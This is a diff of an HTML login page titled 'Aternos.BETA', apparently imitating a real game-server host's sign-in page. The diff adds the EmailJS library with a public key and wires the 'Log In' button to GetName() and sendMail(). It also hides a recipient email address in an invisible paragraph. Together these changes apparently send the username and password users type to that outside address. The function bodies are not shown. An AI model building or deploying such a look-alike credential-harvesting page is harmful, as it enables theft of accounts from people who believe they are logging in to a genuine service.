@@ -6,9 +6,22 @@
     <title>Aternos.BETA</title>
     <link rel="icon" type="image/png" href="img/logo-blue.png" />
     <link rel="stylesheet" href="style.css" />
-    <script src="main.js"></script>
+    <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+  ></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init({
+        publicKey: "y26d5RGj3HqhCDXja",
+      });
+    })();
+  </script>
+
   </head>
+
   <body>
+    <script src="main.js"></script>
     <video autoplay muted loop id="myVideo">
       <source src="pexels_videos_2646392 (1080p).mp4" type="video/mp4" />
     </video>
@@ -24,13 +37,13 @@
         </div>
         <h2>--------------------or--------------------</h2>
         <!--<div class="container3">-->
-          <h3>Sign In with your</h3>
+          <h3>Sign In with existing account</h3>
           <div>
             <div>
               <input
                 type="text"
                 class="inputfield"
-                id="User Name"
+                id="name"
                 placeholder="User name"
               />
             </div>
@@ -38,14 +51,15 @@
               <input
                 type="text"
                 class="inputfield1"
-                id="password"
+                id="pasword"
                 placeholder="password"
               />
             </div>
-            <button class="blabla">Sign In</button>
+            <input type="button" class="blabla" onclick="GetName(), sendMail()" value="Log In">
           </div>
         </div>
       </div>
     </div>
+    <p style="visibility: hidden;" id="email">ad@dehrendorf.com</p>
   </body>
 </html>
